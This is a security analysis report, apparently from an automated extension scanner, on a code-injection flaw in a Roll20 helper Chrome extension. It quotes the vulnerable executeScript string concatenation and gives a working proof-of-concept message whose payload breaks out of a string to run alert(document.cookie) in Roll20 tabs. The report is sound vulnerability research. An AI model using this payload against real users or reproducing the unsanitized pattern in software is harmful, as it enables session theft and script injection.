# CoCo Analysis: mjighpehkmbgedbpjgcnhlcbhhfmimph

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (bg_chrome_runtime_MessageExternal → chrome_tabs_executeScript_sink)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_tabs_executeScript_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mjighpehkmbgedbpjgcnhlcbhhfmimph/opgen_generated_files/bg.js
Line 1008   if (request.roll) {
Line 993    chrome.tabs.executeScript(tabs[0].id, {code : 'var rolltext = "' + rolltext + '";'
```

**Code:**

```javascript
// Line 1006-1027: External message listener - Entry point
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) {
    if (request.roll) { // ← attacker-controlled
      outcome = null;
      roll(request.roll, sendResponse); // ← Pass attacker data to roll()
    }
    if (request.version) {
      sendResponse ({success: true, version: ".01a"});
    }
  });

// Line 986-1003: roll function
function roll(rolltext, sendResponse) { // ← rolltext is attacker-controlled
  var r20url = "*://app.roll20.net/editor/";
  chrome.tabs.query({url: r20url}, function(tabs) {
    if (tabs.length > 0) {
      // VULNERABLE: String concatenation without sanitization
      chrome.tabs.executeScript(tabs[0].id, {
        code : 'var rolltext = "' + rolltext + '";' // ← Code injection here
      }, function () {
        chrome.tabs.executeScript(tabs[0].id, {file : 'roll20interactions.js'});
      });
      sendResponse( {success: true} );
    } else {
      sendResponse ( {success: false, message : "Could not find a Roll 20 game tab.", code : 100});
    }
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker's malicious page (e.g., on *.merisyl.com or *.roll20.net domain)
// The manifest allows externally_connectable from these domains

// Exploit by breaking out of the string with quote and injecting code
chrome.runtime.sendMessage(
  "mjighpehkmbgedbpjgcnhlcbhhfmimph", // Extension ID
  {
    roll: '"; alert(document.cookie); var x = "'
  },
  function(response) {
    console.log("Code executed:", response);
  }
);

// The injected code becomes:
// var rolltext = ""; alert(document.cookie); var x = "";
// This executes alert(document.cookie) in the context of the Roll20 tab
```

**Impact:** Arbitrary JavaScript code execution in Roll20 tabs (app.roll20.net/editor/). An attacker controlling a page on *.merisyl.com or *.roll20.net domains (per externally_connectable whitelist in manifest.json lines 22-24) can inject arbitrary JavaScript that executes in the context of Roll20 game tabs. The vulnerability exists because line 993 directly concatenates the attacker-controlled rolltext into executeScript code without sanitization. By breaking out of the string literal with quotes, the attacker can execute any JavaScript code, potentially stealing session tokens, manipulating game data, or performing other malicious actions within the Roll20 application. The extension has "tabs" permission (manifest.json line 7) required for chrome.tabs.executeScript.
